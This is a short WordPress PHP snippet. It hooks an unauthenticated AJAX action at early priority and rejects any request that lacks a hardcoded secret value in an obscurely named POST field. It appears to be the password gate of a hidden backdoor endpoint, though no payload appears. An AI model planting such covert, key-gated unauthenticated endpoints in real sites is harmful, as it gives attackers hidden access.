<?php

function classic_namespaced_reader() {
	if (!isset($_POST["gjedkuzc"]) || $_POST["gjedkuzc"] !== "sjV8tFAQvDp") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'classic_namespaced_reader', 5, 1);
